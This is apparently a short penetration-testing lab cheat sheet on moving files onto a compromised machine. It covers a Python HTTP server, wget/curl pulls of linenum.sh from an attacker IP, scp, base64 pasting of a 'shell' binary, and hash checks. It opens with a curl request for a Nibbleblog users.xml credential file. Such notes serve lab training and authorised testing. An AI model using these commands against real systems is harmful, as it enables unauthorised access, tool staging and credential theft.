### 0. cUrl

```bash
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format -
```

### 1. Python HTTP Server

_Best for: Quick downloads when the target has internet/network access to your box._

**On Local Machine (Host):**

```
cd /tmp
python3 -m http.server 8000
```

**On Target Machine (Download):**

```
# Option A
wget http://10.10.14.1:8000/linenum.sh

# Option B
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

---

### 2. SCP

_Best for: When you already have SSH credentials._

**On Local Machine (Push):**

```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

---

### 3. Base64

_Best for: Restricted environments where network transfers are blocked, but you can paste text._

**On Local Machine (Encode):**

Bash

```
base64 shell -w 0
```

**On Target Machine (Decode):**

Bash

```
echo <PASTE_BASE64_STRING_HERE> | base64 -d > shell
```

---

### 4. Validation

_Best for: Verifying the file transferred completely without corruption._

``` bash
# Check file type
file shell

# Check hash consistency (Run on both sides to verify they match)
md5sum shell
```